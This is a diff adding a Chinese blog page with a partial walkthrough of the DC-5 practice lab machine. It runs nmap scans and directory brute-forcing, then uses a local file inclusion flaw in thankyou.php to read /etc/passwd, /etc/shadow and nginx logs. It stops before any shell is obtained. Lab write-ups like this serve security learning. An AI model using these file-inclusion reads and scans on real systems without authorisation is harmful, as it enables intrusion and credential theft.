@@ -1,0 +1,953 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#FFD8F2">
+  <meta name="author" content="Sweety">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="DC-5IP扫描开关靶机，分别进行扫描： 1nmap -sN 192.168.204.0&#x2F;24    确认得到目标靶机的IP地址：192.168.204.134 端口扫描 简便版扫描  12nmap -sN -p- 192.168.204.134nmap -sT -p- 192.168.204.134   可以知道，开放的服务端口一共有三个：80、111、48004，三个端口对应的开放服务为：ht">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC-5">
+<meta property="og:url" content="https://haoisbinlove.github.io/2024/07/30/DC-5/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="DC-5IP扫描开关靶机，分别进行扫描： 1nmap -sN 192.168.204.0&#x2F;24    确认得到目标靶机的IP地址：192.168.204.134 端口扫描 简便版扫描  12nmap -sN -p- 192.168.204.134nmap -sT -p- 192.168.204.134   可以知道，开放的服务端口一共有三个：80、111、48004，三个端口对应的开放服务为：ht">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717094648444.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717094804833.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717095154440.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717100525580.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717100650334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717101310142.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717101803699.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717102851778.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717103657468.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717104750906.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717105942484.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717105954567.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717142406079.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717174452209.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717170624251.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717170642477.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717171025161.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717171427205.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717200924814.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717200941862.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717194058442.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717201101644.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717193905317.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718100954941.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718101452541.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718113614750.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/33G0((%40QI847LS61RX4)RHY.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718114303124.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718113449128.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718114818442.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718114845899.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718161048835.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718162910445.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718163019550.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718163405746.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718163540220.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718163732517.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718164219986.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718175801209.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718184000866.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718184943024.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718185200089.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718185651405.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718185941675.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718190652559.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718191251542.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718191456356.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718191748797.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718191857286.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718191931227.png">
+<meta property="article:published_time" content="2024-07-30T14:03:13.000Z">
+<meta property="article:modified_time" content="2024-07-30T14:04:43.969Z">
+<meta property="article:author" content="Sweety">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717094648444.png">
+  
+  
+  
+  <title>DC-5 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"haoisbinlove.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Sweety Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/24.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.08)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="DC-5"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-07-30 22:03" pubdate>
+          2024年7月30日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          33 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">DC-5</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h1><h2 id="IP扫描"><a href="#IP扫描" class="headerlink" title="IP扫描"></a>IP扫描</h2><p>开关靶机，分别进行扫描：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN 192.168.204.0/24<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717094648444.png" srcset="/img/loading.gif" lazyload alt="image-20240717094648444"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717094804833.png" srcset="/img/loading.gif" lazyload alt="image-20240717094804833"></p>
+<p>确认得到目标靶机的IP地址：<code>192.168.204.134</code></p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><ul>
+<li>简便版扫描</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN -p- 192.168.204.134<br>nmap -sT -p- 192.168.204.134<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717095154440.png" srcset="/img/loading.gif" lazyload alt="image-20240717095154440"></p>
+<p>可以知道，开放的服务端口一共有三个：<code>80</code>、<code>111</code>、<code>48004</code>，三个端口对应的开放服务为：<code>http</code>、<code>rpcbind</code>、<code>nimbusdb</code></p>
+<blockquote>
+<p>rpcbind是NFS中用来进行消息通知的服务。</p>
+<p>NimbusDB 是一个云数据库解决方案，旨在提供高可用性和弹性，适用于各种应用程序。它通常支持多种数据模型，如文档、图形和关系型数据，并且常用于需要快速扩展和高性能的场景</p>
+</blockquote>
+<ul>
+<li>详细版扫描</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 80,111,48004 192.168.204.134<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717100525580.png" srcset="/img/loading.gif" lazyload alt="image-20240717100525580"></p>
+<p>根据结果信息可以看到，目标靶机应该有一个网页界面。尝试在浏览器中访问目标靶机IP地址<code>192.168.204.134</code>。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717100650334.png" srcset="/img/loading.gif" lazyload alt="image-20240717100650334"></p>
+<p>可以看到，确实有welcome信息。在进行网页各个项目浏览的时候，好像也没发现什么有用的特别的信息。为了进一步确认是否还有其它有用的信息。使用指纹工具识别该网页的技术构成。</p>
+<ul>
+<li>指纹识别</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717101310142.png" srcset="/img/loading.gif" lazyload alt="image-20240717101310142"></p>
+<p>好，除了得知<code>Nginx的版本为 1.6.2</code>，其他的确认没啥有用的信息了。</p>
+<h2 id="nmap漏扫"><a href="#nmap漏扫" class="headerlink" title="nmap漏扫"></a>nmap漏扫</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -script=vuln -p 80,111,48004 192.168.204.134<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717101803699.png" srcset="/img/loading.gif" lazyload alt="image-20240717101803699"></p>
+<p>根据漏扫信息，可以知道，目标靶机可能存在一个CSRF漏洞：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://192.168.204.134/contact.php">http://192.168.204.134:80/contact.php</a></p>
+</blockquote>
+<blockquote>
+<p>CSRF漏洞是因为web应用程序在用户进行敏感操作时，如修改账号密码、添加账号、转账等，没有校验表单token或者http请求头中的referer值，从而导致恶意攻击者利用普通用户的身份（cookie）完成攻击行为。</p>
+</blockquote>
+<p>言外之意就是，需要攻击方和用户操作方二者都进行操作，才可以完成的攻击行为。</p>
+<p>靶场的攻打自然没有跟我们“互动”的用户。所以CSRF漏洞利用的思路可以暂时搁置了。</p>
+<h2 id="gobuster目录爆破"><a href="#gobuster目录爆破" class="headerlink" title="gobuster目录爆破"></a>gobuster目录爆破</h2><p>截至目前为止，好像都没啥有用的信息，那就尝试进行目录爆破吧~</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.204.134 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure>
+
+<p>爆破得到的结果如下：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://192.168.204.134/images/">http://192.168.204.134/images/</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.204.134/css/">http://192.168.204.134/css/</a></p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717102851778.png" srcset="/img/loading.gif" lazyload alt="image-20240717102851778"></p>
+<p>尝试访问爆破得到的两个链接，结果都显示为：<code>403 Forbidden</code></p>
+<blockquote>
+<p>403 Forbidden是网站访问过程中，常见的错误提示。资源不可用，服务器理解客户的请求，但拒绝处理它。这通常是由于服务器上文件或目录的权限设置导致，简单的理解为没有权限访问此站。</p>
+</blockquote>
+<p>所以，gobuster目录爆破也没得出什么有用的信息！！！！这个时候不要气馁，切换思路，爆破结果会不会跟使用的爆破字典有关系，我们可以尝试切换爆破工具进行再次爆破。</p>
+<p>使用<code>dirsearch</code>试一下吧！</p>
+<h2 id="dirsearch目录爆破"><a href="#dirsearch目录爆破" class="headerlink" title="dirsearch目录爆破"></a>dirsearch目录爆破</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirsearch -u http://192.168.204.134<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717103657468.png" srcset="/img/loading.gif" lazyload alt="image-20240717103657468"></p>
+<p>咦！kali默认没有<code>dirsearch</code>，所以要先进行安装。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get update<br>apt-get install dirsearch<br></code></pre></td></tr></table></figure>
+
+<p>ok！安装完成后，进行dirsearch目录爆破</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717104750906.png" srcset="/img/loading.gif" lazyload alt="image-20240717104750906"></p>
+<blockquote>
+<p>&#x2F;contact.php</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.204.134/css/">http://192.168.204.134/css/</a></p>
+<p>&#x2F;faq.php</p>
+<p>&#x2F;footer.php</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.204.134/images/">http://192.168.204.134/images/</a></p>
+<p>&#x2F;images&#x2F;</p>
+<p>&#x2F;thankyou.php</p>
+<p>这些都是目标靶机IP下的目录文件。</p>
+</blockquote>
+<h2 id="网页目录访问"><a href="#网页目录访问" class="headerlink" title="网页目录访问"></a>网页目录访问</h2><p>对上述爆破得到的目录在浏览器中逐一访问：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://192.168.204.134/contact.php">http://192.168.204.134/contact.php</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.204.134/css/">http://192.168.204.134/css/</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.204.134/faq.php">http://192.168.204.134/faq.php</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.204.134/footer.php">http://192.168.204.134/footer.php</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.204.134/images/">http://192.168.204.134/images/</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.204.134/thankyou.php">http://192.168.204.134/thankyou.php</a></p>
+</blockquote>
+<p>其中的<a target="_blank" rel="noopener" href="http://192.168.204.134/css/%E5%92%8Chttp://192.168.204.134/images/%E4%B9%8B%E5%89%8D%E5%B7%B2%E7%BB%8F%E8%A2%AB%E8%AF%81%E6%98%8E%E6%B2%A1%E6%9C%89%E6%9D%83%E9%99%90%E8%AE%BF%E9%97%AE%E3%80%82">http://192.168.204.134/css/和http://192.168.204.134/images/之前已经被证明没有权限访问。</a></p>
+<p>然后，<a target="_blank" rel="noopener" href="http://192.168.204.134/contact.php%E5%92%8Chttp://192.168.204.134/faq.php%E5%88%86%E5%88%AB%E5%AF%B9%E5%BA%94%E7%9D%80%E7%BD%91%E9%A1%B5%E9%A6%96%E9%A1%B5%E4%B8%AD%E7%9A%84%60Contact%60%E5%92%8C%60FAQ%60%E6%A8%A1%E5%9D%97%E3%80%82%E4%B9%8B%E5%89%8D%E5%B7%B2%E7%BB%8F%E7%9C%8B%E8%BF%87%E4%BA%86%EF%BC%8C%E5%85%B6%E4%B8%AD%E6%B2%A1%E6%9C%89%E4%BB%80%E4%B9%88%E6%9C%89%E7%94%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E3%80%82">http://192.168.204.134/contact.php和http://192.168.204.134/faq.php分别对应着网页首页中的`Contact`和`FAQ`模块。之前已经看过了，其中没有什么有用的信息。</a></p>
+<p>访问<a target="_blank" rel="noopener" href="http://192.168.204.134/footer.php%EF%BC%8C%E5%BE%97%E5%88%B0%EF%BC%9A">http://192.168.204.134/footer.php，得到：</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717105942484.png" srcset="/img/loading.gif" lazyload alt="image-20240717105942484"></p>
+<p>最后的<a target="_blank" rel="noopener" href="http://192.168.204.134/thankyou.php%EF%BC%8C%E5%BE%97%E5%88%B0%EF%BC%9A">http://192.168.204.134/thankyou.php，得到：</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717105954567.png" srcset="/img/loading.gif" lazyload alt="image-20240717105954567"></p>
+<p>经过简单的对比可以发现，footer.php文件的内容与thankyou.php文件内容下的页脚内容一致，因此，可以大致猜测两个文件之间存在着<code>文件包含</code>关系。</p>
+<p>从<code>文件包含</code>入手。</p>
+<h2 id="文件包含漏洞利用"><a href="#文件包含漏洞利用" class="headerlink" title="文件包含漏洞利用"></a>文件包含漏洞利用</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/369924.html">Web漏洞之文件包含漏洞</a></p>
+<blockquote>
+<p>首先先来明确一下，文件包含漏洞利用，利用的是什么？怎么利用的？想要实现的效果又是什么？</p>
+<p>答：</p>
+<p>问题一，利用的自然是“文件包含漏洞”，由于对方通过php函数引入文件时，没有对传入的文件名进行合理的校验，从而导致操作了预想之外的文件。</p>
+<p>问题二，文件包含的利用方法是，在搜索地址栏（或其它注入点）处，对于包含了其它文件的url，后面添加<code>？file=文件路径（精确到文件名）</code></p>
+<p>问题三，利用文件包含漏洞，我们本着getshell的目的，当然是想要获取一些重要的文件信息。在linux系统下，在我们还未取得登陆账户的情况下，一般都是想查找密码或用户名文件：<code>/etc/passwd</code>（账户）、<code>/etc/shadow</code>（密码）</p>
+</blockquote>
+<p>综上，我们执行如下文件包含url:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.204.134/thankyou.php?file=/etc/passwd<br>http://192.168.204.134/thankyou.php?file=/etc/shadow<br></code></pre></td></tr></table></figure>
+
+<p>在浏览器搜索框执行，得到如下结果：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717142406079.png" srcset="/img/loading.gif" lazyload alt="image-20240717142406079"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717174452209.png" srcset="/img/loading.gif" lazyload alt="image-20240717174452209"></p>
+<p><code>/etc/passwd</code>账户文件内容被成功返回并显示在浏览器页面中。这表明靶机网站确实存在文件包含漏洞。但是<code>/etc/shadow</code>密码文件并没有被成功显示在界面上，可以猜测是权限不足的问题。</p>
+<h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/304690.html">红蓝对抗之服务攻防：Nginx中间件渗透总结</a></p>
+<h3 id="先验知识"><a href="#先验知识" class="headerlink" title="先验知识"></a>先验知识</h3><blockquote>
+<p>由上述端口扫描以及指纹识别可以得知，目标靶机网站使用的web服务器和反向代理是nginx（1.6.1版本）</p>
+<p>nginx会将执行的命令记录下来并写入日志文件中，所以先读取一下nignx的配置信息，查看日志文件的位置</p>
+</blockquote>
+<h3 id="nginx日志文件读取"><a href="#nginx日志文件读取" class="headerlink" title="nginx日志文件读取"></a>nginx日志文件读取</h3><p><strong>总思路：利用<code>文件包含漏洞</code>，通过<code>burpsuite</code>抓取数据包获取nginx的不同日志文件。</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43945983/article/details/138070113">linux 查看nginx日志</a></p>
+<blockquote>
+<p>配置文件路径： &#x2F;etc&#x2F;nginx&#x2F;nginx.conf</p>
+<p>错误日志路径：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p>
+<p>访问日志：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+<p>利用文件包含漏洞，进行”文件注入“：</p>
+<p>?file&#x3D;&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</p>
+<p>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p>
+<p>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+</blockquote>
+<p>对这三个目标”注入文件“进行逐一测试：</p>
+<ul>
+<li><strong>?file&#x3D;&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</strong></li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717170624251.png" srcset="/img/loading.gif" lazyload alt="image-20240717170624251"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717170642477.png" srcset="/img/loading.gif" lazyload alt="image-20240717170642477"></p>
+<p>”注入“成功，对该数据包进行重放，看其响应内容。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717171025161.png" srcset="/img/loading.gif" lazyload alt="image-20240717171025161"></p>
+<p>响应html内容中，在其中的发现了<code>访问日志和错误日志的文件路径</code>。</p>
+<ul>
+<li><strong>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</strong></li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717171427205.png" srcset="/img/loading.gif" lazyload alt="image-20240717171427205"></p>
+<p>同样进行数据包重放，在其响应内容中查找有用的信息。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717200924814.png" srcset="/img/loading.gif" lazyload alt="image-20240717200924814"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717200941862.png" srcset="/img/loading.gif" lazyload alt="image-20240717200941862"></p>
